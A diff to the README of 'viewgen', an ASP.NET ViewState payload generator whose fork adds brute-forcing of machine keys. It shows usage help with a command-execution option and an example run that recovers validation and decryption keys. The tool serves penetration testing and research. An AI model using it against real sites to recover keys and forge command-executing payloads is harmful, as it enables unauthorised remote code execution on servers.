@@ -2,7 +2,7 @@
 
 ### ASP.NET ViewState Generator
 
-**viewgen** is a ViewState tool capable of generating both signed and encrypted payloads with leaked validation keys or `web.config` files
+**viewgen** is a ViewState tool capable of generating both signed and encrypted payloads with leaked validation keys or `web.config` files, this fork can also bruteforce the algorithms used for encryption and validation with a list of machine keys.
 
 ---------------
 
@@ -20,43 +20,47 @@
 
 ### Usage
 ```
-$ viewgen -h
-usage: viewgen [-h] [--webconfig WEBCONFIG] [-m MODIFIER] [-c COMMAND]
-               [--decode] [--guess] [--check] [--vkey VKEY] [--valg VALG]
-               [--dkey DKEY] [--dalg DALG] [-e] [-f FILE]
-               [payload]
+usage: viewgen [-h] [--webconfig WEBCONFIG] [-m MODIFIER] [-c COMMAND] [--decode] [--guess] [--check] [--vkey VKEY] [--valg VALG] [--dkey DKEY] [--dalg DALG] [-e] [-f FILE] [-b] [payload]
 
-viewgen is a ViewState tool capable of generating both signed and encrypted
-payloads with leaked validation keys or web.config files
+viewgen is a ViewState tool capable of generating both signed and encrypted payloads with leaked validation keys or web.config files
 
 positional arguments:
   payload               ViewState payload (base 64 encoded)
 
-optional arguments:
+options:
   -h, --help            show this help message and exit
   --webconfig WEBCONFIG
-                        automatically load keys and algorithms from a
-                        web.config file
+                        automatically load keys and algorithms from a web.config file
   -m MODIFIER, --modifier MODIFIER
                         VIEWSTATEGENERATOR value
   -c COMMAND, --command COMMAND
                         command to execute
   --decode              decode a ViewState payload
-  --guess               guess signature and encryption mode for a given
-                        payload
-  --check               check if modifier and keys are correct for a given
-                        payload
+  --guess               guess signature and encryption mode for a given payload
+  --check               check if modifier and keys are correct for a given payload
   --vkey VKEY           validation key
   --valg VALG           validation algorithm
   --dkey DKEY           decryption key
   --dalg DALG           decryption algorithm
   -e, --encrypted       ViewState is encrypted
   -f FILE, --file FILE  read ViewState payload from file
+  -b, --bruteforce      bruteforce encryption and validation algorithms with some machine keys at machine_keys.txt
 ```
 
 ---------------
 
 ### Examples
+
+```bash
+./viewgen --modifier CA0B0334 "/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRk" -b
+[+] Bruteforcing algorithms
+/wEPDwUKMTYyODkyNTEzMw9kFgICAw8WAh4HZW5jdHlwZQUTbXVsdGlwYXJ0L2Zvcm0tZGF0YWRkZFMHb9G3aEMTetiFkfAFnAuGQtg=
+[+] Signature match
+[+] Validation Algorithm: SHA1
+[+] Validation Key: f2d27df0348e9a3ead6ac66330c31f821394d4cd1a5e139eee85ea9d9f2a963e55ec87572f699fb834292cc9e37ad56b6b26aa379106cba5e9aa544c688f3e92
+[+] Decryption Algorithm: AES
+[+] Decryption Key: f6d5a5c8ddec57481610829f58d6c95bdac5fa21082f3fa9cb5a36dceaacbedb
+```
 
 ```bash
 $ viewgen --decode --check --webconfig web.config --modifier CA0B0334 "zUylqfbpWnWHwPqet3cH5Prypl94LtUPcoC7ujm9JJdLm8V7Ng4tlnGPEWUXly+CDxBWmtOit2HY314LI8ypNOJuaLdRfxUK7mGsgLDvZsMg/MXN31lcDsiAnPTYUYYcdEH27rT6taXzDWupmQjAjraDueY="
